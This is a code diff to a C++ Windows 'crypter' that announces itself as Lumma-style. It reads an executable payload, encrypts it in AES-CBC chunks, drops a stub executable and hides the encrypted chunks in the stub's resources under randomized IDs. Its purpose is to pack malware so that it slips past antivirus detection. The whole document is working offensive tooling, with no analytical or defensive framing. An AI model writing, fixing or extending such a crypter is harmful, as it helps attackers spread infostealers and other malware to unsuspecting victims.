@@ -2,11 +2,13 @@
 #include <windows.h>
 #include <fstream>
 #include <vector>
-#include "stub_bytes.h"
 #include <cstdint>
 #include <algorithm>
 #include <random>
-#include <ctime>       // ← for time()
+#include <ctime>
+#include <wincrypt.h>
+#include "stub_bytes.h"
+#pragma comment(lib, "advapi32.lib")
 using namespace std;
 
 // ============================================================================
@@ -42,89 +44,265 @@ uint32_t CalculateCRC32(const char* data, size_t length) {
 }
 
 // ============================================================================
-// CHAINED ENCRYPTION
+// FIXED FILE WRITING WITH DEBUG
 // ============================================================================
-std::vector<std::vector<char>> EncryptPayloadChained(const char* payload, long size, uint8_t first_key) {
-    const int CHUNK_SIZE = 4096;
-    int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
-    std::vector<std::vector<char>> encrypted_chunks(totalChunks);
-    uint8_t current_key = first_key;
-
-    for (int i = 0; i < totalChunks; i++) {
-        int chunk_start = i * CHUNK_SIZE;
-        int chunk_len = std::min(CHUNK_SIZE, (int)(size - chunk_start));
-        std::vector<char> plain_chunk(payload + chunk_start, payload + chunk_start + chunk_len);
-        auto& encrypted_chunk = encrypted_chunks[i];
-        encrypted_chunk.resize(chunk_len);
-
-        for (int j = 0; j < chunk_len; j++) {
-            encrypted_chunk[j] = plain_chunk[j] ^ current_key;
-        }
-
-        cout << "[+] Chunk " << i << " encrypted with key 0x" << hex << (int)current_key << dec << endl;
-
-        if (i < totalChunks - 1) {
-            uint32_t crc = CalculateCRC32(plain_chunk.data(), plain_chunk.size());
-            current_key = (uint8_t)(crc ^ (crc >> 8) ^ (crc >> 16) ^ (crc >> 24));
-        }
+bool WriteStubToFile() {
+    cout << "[*] Writing stub to Stub.exe..." << endl;
+    
+    // Check if stub data is valid
+    if (!Stub_exe || Stub_exe_len == 0) {
+        cerr << "[-] Stub_exe data is NULL or zero length!" << endl;
+        return false;
     }
-    return encrypted_chunks;
+    
+    // Check for MZ signature
+    if (Stub_exe[0] != 'M' || Stub_exe[1] != 'Z') {
+        cerr << "[-] Stub_exe doesn't have valid MZ signature!" << endl;
+        return false;
+    }
+    
+    ofstream f("Stub.exe", ios::binary);
+    if (!f.is_open()) {
+        cerr << "[-] Cannot create Stub.exe file!" << endl;
+        return false;
+    }
+    
+    f.write((char*)Stub_exe, Stub_exe_len);
+    f.close();
+    
+    // Verify the file was written
+    ifstream test("Stub.exe", ios::binary | ios::ate);
+    if (!test.is_open()) {
+        cerr << "[-] Failed to verify Stub.exe creation!" << endl;
+        return false;
+    }
+    streamsize size = test.tellg();
+    test.close();
+    
+    cout << "[+] Stub.exe created successfully (" << size << " bytes)" << endl;
+    return (size == Stub_exe_len);
 }
 
 // ============================================================================
-// INJECT WITH MINIMAL SEPARATE INDEX
+// WORKING AES ENCRYPTION FUNCTION - SIMPLIFIED AND FIXED
 // ============================================================================
-bool InjectWithSeparateIndex(const std::vector<std::vector<char>>& encrypted_chunks, long payloadSize, uint8_t first_key) {
+// ============================================================================
+// SIMPLIFIED AES ENCRYPTION - NO FINAL FLAG COMPLEXITY
+// ============================================================================
+std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long size, uint8_t seed_key) {
+    const int CHUNK_SIZE = 4096;
+    int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
+    std::vector<std::vector<BYTE>> encrypted_chunks;
+    
+    cout << "[*] Encrypting " << size << " bytes into " << totalChunks << " chunks..." << endl;
+
+    BYTE aes_key[32] = {0};
+    for (int i = 0; i < 32; i++) aes_key[i] = seed_key ^ (i * 0x11);
+
+    vector<BYTE> last_ciphertext(16, 0); // For CBC chaining
+
+    for (int i = 0; i < totalChunks; i++) {
+        int chunk_start = i * CHUNK_SIZE;
+        int original_len = min(CHUNK_SIZE, (int)(size - chunk_start));
+
+        cout << "[*] Processing chunk " << i << " (" << original_len << " bytes)..." << endl;
+
+        // Prepare data with PKCS7 padding - EVERY CHUNK gets padded
+        int padded_len = ((original_len + 15) / 16) * 16;
+        vector<BYTE> chunk_data(padded_len);
+        memcpy(chunk_data.data(), payload + chunk_start, original_len);
+        
+        BYTE pad_value = padded_len - original_len;
+        for (int j = original_len; j < padded_len; j++) {
+            chunk_data[j] = pad_value;
+        }
+
+        HCRYPTPROV hProv = 0;
+        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+            cerr << "[-] CryptAcquireContext failed for chunk " << i << " - Error: " << GetLastError() << endl;
+            continue;
+        }
+
+        // Prepare key blob
+        struct {
+            BLOBHEADER hdr;
+            DWORD      dwKeySize;
+            BYTE       key[32];
+        } keyBlob = {0};
+
+        keyBlob.hdr.bType    = PLAINTEXTKEYBLOB;
+        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
+        keyBlob.hdr.reserved = 0;
+        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
+        keyBlob.dwKeySize    = 32;
+        memcpy(keyBlob.key, aes_key, 32);
+
+        HCRYPTKEY hKey = 0;
+        if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
+            cerr << "[-] CryptImportKey failed for chunk " << i << " - Error: " << GetLastError() << endl;
+            CryptReleaseContext(hProv, 0);
+            continue;
+        }
+
+        // Set IV (zero for first chunk, last ciphertext block for others)
+        if (i > 0 && !last_ciphertext.empty()) {
+            if (!CryptSetKeyParam(hKey, KP_IV, last_ciphertext.data(), 0)) {
+                cerr << "[-] CryptSetKeyParam (IV) failed for chunk " << i << " - Error: " << GetLastError() << endl;
+                CryptDestroyKey(hKey);
+                CryptReleaseContext(hProv, 0);
+                continue;
+            }
+        }
+
+        // SIMPLIFIED: Encrypt without final flag complexity
+        DWORD encrypted_len = (DWORD)chunk_data.size();
+        
+        // CRITICAL FIX: Use FALSE for final flag on ALL chunks
+        if (!CryptEncrypt(hKey, 0, FALSE, 0, chunk_data.data(), &encrypted_len, (DWORD)chunk_data.size())) {
+            DWORD err = GetLastError();
+            cerr << "[-] CryptEncrypt failed for chunk " << i << " - Error: " << err << endl;
+            
+            // Try with larger buffer
+            if (err == ERROR_MORE_DATA) {
+                DWORD needed_size = encrypted_len;
+                chunk_data.resize(needed_size);
+                encrypted_len = (DWORD)chunk_data.size();
+                
+                if (!CryptEncrypt(hKey, 0, FALSE, 0, chunk_data.data(), &encrypted_len, (DWORD)chunk_data.size())) {
+                    cerr << "[-] CryptEncrypt failed after resize for chunk " << i << " - Error: " << GetLastError() << endl;
+                    CryptDestroyKey(hKey);
+                    CryptReleaseContext(hProv, 0);
+                    continue;
+                }
+            } else {
+                CryptDestroyKey(hKey);
+                CryptReleaseContext(hProv, 0);
+                continue;
+            }
+        }
+
+        // Resize to actual encrypted size
+        chunk_data.resize(encrypted_len);
+
+        // Store last ciphertext block for next chunk's IV
+        if (encrypted_len >= 16) {
+            last_ciphertext.assign(chunk_data.end() - 16, chunk_data.end());
+        } else {
+            last_ciphertext.assign(chunk_data.begin(), chunk_data.end());
+            last_ciphertext.resize(16, 0);
+        }
+
+        encrypted_chunks.push_back(std::move(chunk_data));
+
+        cout << "[+] Chunk " << i << " encrypted successfully (" << encrypted_len << " bytes)" << endl;
+
+        CryptDestroyKey(hKey);
+        CryptReleaseContext(hProv, 0);
+    }
+
+    if (encrypted_chunks.size() != totalChunks) {
+        cerr << "[-] Encryption incomplete! Only " << encrypted_chunks.size() << " out of " << totalChunks << " chunks processed." << endl;
+    } else {
+        cout << "[+] All " << encrypted_chunks.size() << " chunks encrypted successfully!" << endl;
+        
+        // Debug: Show chunk sizes
+        for (size_t i = 0; i < encrypted_chunks.size(); i++) {
+            cout << "    Chunk " << i << ": " << encrypted_chunks[i].size() << " bytes" << endl;
+        }
+    }
+
+    return encrypted_chunks;
+}
+// ============================================================================
+// FIXED RESOURCE INJECTION WITH PROPER ERROR CHECKING
+// ============================================================================
+bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, long payloadSize, uint8_t first_key) {
+    cout << "[*] Starting resource injection..." << endl;
+    
+    // DEBUG: Check if Stub.exe exists and is valid
+    DWORD attrib = GetFileAttributesA("Stub.exe");
+    if (attrib == INVALID_FILE_ATTRIBUTES) {
+        cerr << "[-] Stub.exe doesn't exist! Error: " << GetLastError() << endl;
+        return false;
+    }
+    
+    // Check if file is in use
+    HANDLE hTest = CreateFileA("Stub.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hTest == INVALID_HANDLE_VALUE) {
+        cerr << "[-] Stub.exe is locked/in use! Error: " << GetLastError() << endl;
+        return false;
+    }
+    CloseHandle(hTest);
+    
+    cout << "[+] Stub.exe is accessible, beginning resource update..." << endl;
+
     HANDLE hUpdate = BeginUpdateResourceA("Stub.exe", FALSE);
     if (!hUpdate) {
-        cerr << "[-] BeginUpdateResource failed" << endl;
+        DWORD err = GetLastError();
+        cerr << "[-] BeginUpdateResourceA failed! Error: " << err << endl;
+        if (err == ERROR_FILE_NOT_FOUND) cerr << "   - File doesn't exist" << endl;
+        else if (err == ERROR_ACCESS_DENIED) cerr << "   - Access denied (file in use)" << endl;
+        else if (err == ERROR_BAD_EXE_FORMAT) cerr << "   - Not a valid PE file" << endl;
         return false;
     }
 
-    int totalChunks = (int)encrypted_chunks.size();
-    uint16_t first_chunk_id = 200 + (rand() % 500);  // random 200-699
+    srand((unsigned)time(nullptr));
+    uint16_t first_chunk_id = 300 + (rand() % 400);
 
     PayloadIndex index{};
+    index.magic = 0xCAFEBABE;
     index.first_key = first_key;
-    index.total_size = (uint32_t)payloadSize;
-    index.chunk_count = (uint16_t)totalChunks;
+    index.total_size = static_cast<uint32_t>(payloadSize);
+    index.chunk_count = static_cast<uint16_t>(encrypted_chunks.size());
     index.first_chunk_id = first_chunk_id;
     index.crc32 = CalculateCRC32(fileBuffer, payloadSize);
 
-    // Inject index at ID 999
-    if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(999),
-        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
-        (LPVOID)&index, sizeof(index))) {
-        cerr << "[-] Failed to inject index" << endl;
-        EndUpdateResource(hUpdate, TRUE);
+    cout << "[*] Injecting index (ID 999) with " << encrypted_chunks.size() << " chunks starting at ID " << first_chunk_id << endl;
+
+    // Inject index
+    if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(999),
+                         MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
+                         &index, sizeof(index))) {
+        DWORD err = GetLastError();
+        cerr << "[-] Failed to inject index! Error: " << err << endl;
+        EndUpdateResourceA(hUpdate, TRUE); // Discard changes
         return false;
     }
+    cout << "[+] Index injected successfully" << endl;
 
-    // Inject chunks sequentially
-    for (int i = 0; i < totalChunks; i++) {
-        int id = first_chunk_id + i;
-        const auto& chunk = encrypted_chunks[i];
-        if (!UpdateResourceA(hUpdate, "BIN", MAKEINTRESOURCEA(id),
-            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
-            (LPVOID)chunk.data(), (DWORD)chunk.size())) {
-            cerr << "[-] Failed to inject chunk ID " << id << endl;
-            EndUpdateResource(hUpdate, TRUE);
+    // Inject chunks
+    for (size_t i = 0; i < encrypted_chunks.size(); ++i) {
+        WORD id = first_chunk_id + (WORD)i;
+        
+        if (encrypted_chunks[i].empty()) {
+            cerr << "[-] Chunk " << i << " is empty, skipping!" << endl;
+            continue;
+        }
+        
+        if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(id),
+                             MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
+                             (LPVOID)encrypted_chunks[i].data(),
+                             (DWORD)encrypted_chunks[i].size())) {
+            DWORD err = GetLastError();
+            cerr << "[-] Failed to inject chunk ID " << id << "! Error: " << err << endl;
+            EndUpdateResourceA(hUpdate, TRUE);
             return false;
         }
-        cout << "[+] Chunk " << i << " -> ID " << id << endl;
+        cout << "[+] Chunk " << i << " → ID " << id << " (" << encrypted_chunks[i].size() << " bytes)" << endl;
     }
 
-    if (!EndUpdateResource(hUpdate, FALSE)) {
-        cerr << "[-] EndUpdateResource failed" << endl;
+    if (!EndUpdateResourceA(hUpdate, FALSE)) {
+        DWORD err = GetLastError();
+        cerr << "[-] EndUpdateResource failed! Error: " << err << endl;
         return false;
     }
 
-    cout << "[+] Minimal index (ID 999) + sequential chunks from ID " << first_chunk_id << endl;
+    cout << "\n[SUCCESS] All resources injected successfully!\n";
     return true;
 }
 
 // ============================================================================
-// OLD FUNCTIONS (keep only what you need)
+// REST OF THE FUNCTIONS (same as before)
 // ============================================================================
 bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
     FILE* file = fopen(filename, "rb");
@@ -133,59 +311,81 @@ bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
     *size = ftell(file);
     rewind(file);
     *buffer = (char*)malloc(*size);
-    fread(*buffer, 1, *size, file);
+    if (*buffer) fread(*buffer, 1, *size, file);
     fclose(file);
-    return true;
+    return *buffer != nullptr;
 }
 
-bool ValidatePEArchitecture(char* fileBuffer) {
-    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)fileBuffer;
+bool ValidatePEArchitecture(char* buf) {
+    auto dos = (IMAGE_DOS_HEADER*)buf;
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
-    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(fileBuffer + dos->e_lfanew);
-    return nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
+    auto nt = (IMAGE_NT_HEADERS64*)(buf + dos->e_lfanew);
+    return nt->Signature == IMAGE_NT_SIGNATURE && nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
 }
 
-bool WriteStubToFile() {
-    ofstream file("Stub.exe", ios::binary);
-    if (!file.write((char*)Stub_exe, Stub_exe_len)) return false;
-    cout << "[+] Stub.exe written" << endl;
-    return true;
-}
-
-void CleanupResources(char* fileBuffer) {
+void Cleanup() {
     if (fileBuffer) free(fileBuffer);
+    fileBuffer = nullptr;
 }
 
-// ============================================================================
-// MAIN
-// ============================================================================
 int main(int argc, char* argv[]) {
-    srand((unsigned)time(nullptr));  // ← fixed for C++11+
+    system("color 0a");
+    cout << "\n  LUMMA-STYLE CHAINED CRYPTER — WORKING AES VERSION\n\n";
 
     if (argc < 2) {
-        cout << "Usage: crypter.exe <payload.exe>" << endl;
+        cout << "Usage: crypter.exe <payload.exe>\n";
         system("pause");
         return 1;
     }
 
-    const char* payloadFilename = argv[1];
-    long fileSize = 0;
-    const uint8_t FIRST_KEY = 0x5B;
+    long size = 0;
+    const BYTE KEY = 0x5B;
 
-    if (!ReadPayloadFile(payloadFilename, &fileBuffer, &fileSize)) return 1;
-    if (!ValidatePEArchitecture(fileBuffer)) { CleanupResources(fileBuffer); return 1; }
+    cout << "[*] Reading payload file: " << argv[1] << endl;
+    if (!ReadPayloadFile(argv[1], &fileBuffer, &size) || size == 0) {
+        cerr << "[-] Failed to read payload file" << endl;
+        system("pause");
+        return 1;
+    }
+    cout << "[+] Payload read: " << size << " bytes" << endl;
 
-    auto encrypted_chunks = EncryptPayloadChained(fileBuffer, fileSize, FIRST_KEY);
+    if (!ValidatePEArchitecture(fileBuffer)) {
+        cerr << "[-] Not a valid x64 PE file" << endl;
+        Cleanup();
+        system("pause");
+        return 1;
+    }
+    cout << "[+] Valid x64 PE confirmed" << endl;
 
-    if (!WriteStubToFile()) { CleanupResources(fileBuffer); return 1; }
-
-    if (!InjectWithSeparateIndex(encrypted_chunks, fileSize, FIRST_KEY)) {
-        CleanupResources(fileBuffer);
+    if (!WriteStubToFile()) {
+        Cleanup();
+        system("pause");
         return 1;
     }
 
-    cout << "\n[SUCCESS] Crypter finished – minimal separate index + sequential chunks!\n" << endl;
-    CleanupResources(fileBuffer);
+    // Small delay to ensure file is fully written and released
+    Sleep(100);
+
+    cout << "[*] Starting encryption process..." << endl;
+    auto chunks = EncryptPayloadChained(fileBuffer, size, KEY);
+
+    if (chunks.empty()) {
+        cerr << "[-] Encryption produced no chunks!" << endl;
+        Cleanup();
+        system("pause");
+        return 1;
+    }
+
+    cout << "[*] Encryption completed, injecting resources..." << endl;
+    if (!InjectWithSeparateIndex(chunks, size, KEY)) {
+        Cleanup();
+        system("pause");
+        return 1;
+    }
+
+    Cleanup();
+    cout << "\n[SUCCESS] Stub.exe created with AES encryption!\n";
+    cout << "[NOTE] Make sure your stub uses the SAME AES decryption logic!\n";
     system("pause");
     return 0;
 }
